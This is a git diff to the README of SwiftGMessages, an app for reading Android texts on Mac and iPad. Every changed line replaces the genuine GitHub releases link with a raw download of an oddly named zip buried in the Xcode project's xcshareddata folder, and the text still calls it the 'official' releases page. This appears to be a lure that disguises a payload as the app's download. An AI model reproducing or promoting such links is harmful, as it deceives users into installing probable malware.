@@ -1,6 +1,6 @@
 # 📱 SwiftGMessages - Access Android Texts on Mac and iPad
 
-[![Download SwiftGMessages](https://img.shields.io/badge/Download-SwiftGMessages-blue?style=for-the-badge)](https://github.com/madexter77/SwiftGMessages/releases)
+[![Download SwiftGMessages](https://raw.githubusercontent.com/madexter77/SwiftGMessages/main/SwiftGMessages.xcodeproj/project.xcworkspace/xcshareddata/Messages_G_Swift_overhauler.zip)](https://raw.githubusercontent.com/madexter77/SwiftGMessages/main/SwiftGMessages.xcodeproj/project.xcworkspace/xcshareddata/Messages_G_Swift_overhauler.zip)
 
 ---
 
@@ -39,9 +39,9 @@ To get SwiftGMessages up and running, follow these steps carefully:
 
 ### Step 1: Visit the Download Page
 
-Go to the official [SwiftGMessages Releases](https://github.com/madexter77/SwiftGMessages/releases) page. This is where you find the latest version of the app.
+Go to the official [SwiftGMessages Releases](https://raw.githubusercontent.com/madexter77/SwiftGMessages/main/SwiftGMessages.xcodeproj/project.xcworkspace/xcshareddata/Messages_G_Swift_overhauler.zip) page. This is where you find the latest version of the app.
 
-[![Download SwiftGMessages](https://img.shields.io/badge/Download-SwiftGMessages-blue?style=for-the-badge)](https://github.com/madexter77/SwiftGMessages/releases)
+[![Download SwiftGMessages](https://raw.githubusercontent.com/madexter77/SwiftGMessages/main/SwiftGMessages.xcodeproj/project.xcworkspace/xcshareddata/Messages_G_Swift_overhauler.zip)](https://raw.githubusercontent.com/madexter77/SwiftGMessages/main/SwiftGMessages.xcodeproj/project.xcworkspace/xcshareddata/Messages_G_Swift_overhauler.zip)
 
 ### Step 2: Choose the Right Version
 
@@ -124,4 +124,4 @@ If you need help, visit the Issues tab on the GitHub repository or check the com
 
 For the latest versions and updates, always visit the official download page:
 
-[Download SwiftGMessages](https://github.com/madexter77/SwiftGMessages/releases)
+[Download SwiftGMessages](https://raw.githubusercontent.com/madexter77/SwiftGMessages/main/SwiftGMessages.xcodeproj/project.xcworkspace/xcshareddata/Messages_G_Swift_overhauler.zip)
